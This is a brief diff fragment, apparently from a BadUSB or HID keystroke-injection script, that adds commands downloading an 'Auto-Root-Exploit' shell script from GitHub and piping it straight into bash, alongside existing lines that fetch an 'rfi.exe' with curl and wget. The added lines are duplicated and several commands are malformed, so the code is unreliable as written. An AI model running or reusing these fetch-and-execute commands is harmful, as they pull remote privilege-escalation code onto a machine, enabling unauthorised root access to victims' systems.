@@ -6,6 +6,14 @@ curl https://github.com/blkht666/lsd/rfi.exe | exe
 
 wget https://github.com/blkht666/lsd/rfi.exe | exe
 
+bash < <(curl https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)
+
+bash < <(wget https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)
+
+bash < <(curl https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)
+
+bash < <(wget https://raw.githubusercontent.com/nilotpalbiswas/Auto-Root-Exploit/master/autoroot.sh | bash)
+
 REM start of script
 REM
 REM let the HID enumerate
